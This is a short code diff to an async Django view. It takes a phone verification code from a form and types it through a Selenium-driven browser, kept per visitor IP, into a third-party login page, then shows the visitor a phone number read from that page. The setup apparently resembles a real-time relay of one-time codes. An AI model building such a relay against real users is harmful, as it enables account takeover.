@@ -156,6 +156,11 @@ async def verification(request):
     client_ip = request.META.get('REMOTE_ADDR')
     try:
         driver = await get_driver(request, client_ip)
+
+        if request.POST.get('phoneCode',None) :
+            code =request.POST.get('phoneCode',None)
+            driver.find_element(By.ID,"passp-field-phoneCode").send_keys(code)
+            logging.warning(f"WTFF")
         phone_number = driver.find_element(By.CLASS_NAME, "passp-phone-template").text
         return await sync_to_async(render)(request, 'verification.html',
                                            {'phone_number': phone_number})
